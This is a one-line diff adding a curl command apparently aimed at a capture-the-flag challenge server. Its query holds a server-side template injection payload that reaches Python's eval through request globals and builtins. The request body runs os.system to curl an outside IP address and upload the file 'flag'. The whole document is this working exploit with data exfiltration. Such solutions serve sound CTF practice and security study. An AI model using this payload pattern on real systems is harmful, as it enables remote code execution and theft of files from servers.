@@ -1,0 +1,1 @@
+curl "https://sinking-calculator.chal.imaginaryctf.org/calc?query=request.application.__globals__.__builtins__%5B%27eval%27%5D%28request.data%29" -X GET --data-raw "__import__('os').system('curl http://140.115.50.64:3535 -F f=@flag')"
